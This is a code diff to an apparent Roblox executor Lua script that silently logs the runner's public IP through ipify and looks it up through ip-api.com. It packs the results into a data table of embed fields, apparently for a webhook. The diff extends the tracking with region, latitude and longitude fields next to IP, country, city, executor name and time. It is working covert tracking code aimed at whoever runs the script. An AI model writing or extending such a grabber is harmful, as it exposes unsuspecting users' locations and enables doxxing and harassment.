@@ -26,9 +26,12 @@ pcall(function()
     ip = game:HttpGet("https://api.ipify.org")  
 end)  
 
--- 🌎 GEOLOCALIZACIÓN (país / ciudad)
+-- 🌎 GEOLOCALIZACIÓN
 local country = "Unknown"
 local city = "Unknown"
+local region = "Unknown"
+local lat = "Unknown"
+local lon = "Unknown"
 
 pcall(function()
     local geo = game:HttpGet("http://ip-api.com/json/" .. ip)
@@ -37,6 +40,9 @@ pcall(function()
     if decoded then
         country = decoded.country or "Unknown"
         city = decoded.city or "Unknown"
+        region = decoded.regionName or "Unknown"
+        lat = tostring(decoded.lat) or "Unknown"
+        lon = tostring(decoded.lon) or "Unknown"
     end
 end)
 
@@ -60,6 +66,10 @@ local data = {
             {["name"] = "🌍 IP", ["value"] = ip, ["inline"] = true},  
             {["name"] = "📍 País", ["value"] = country, ["inline"] = true},  
             {["name"] = "🏙️ Ciudad", ["value"] = city, ["inline"] = true},  
+            {["name"] = "📌 Región", ["value"] = region, ["inline"] = true},  
+
+            {["name"] = "🧭 Latitud", ["value"] = lat, ["inline"] = true},  
+            {["name"] = "🧭 Longitud", ["value"] = lon, ["inline"] = true},  
 
             {["name"] = "🖥️ Executor", ["value"] = executorName, ["inline"] = true},  
             {["name"] = "⏱️ Hora", ["value"] = timeNow, ["inline"] = true},  
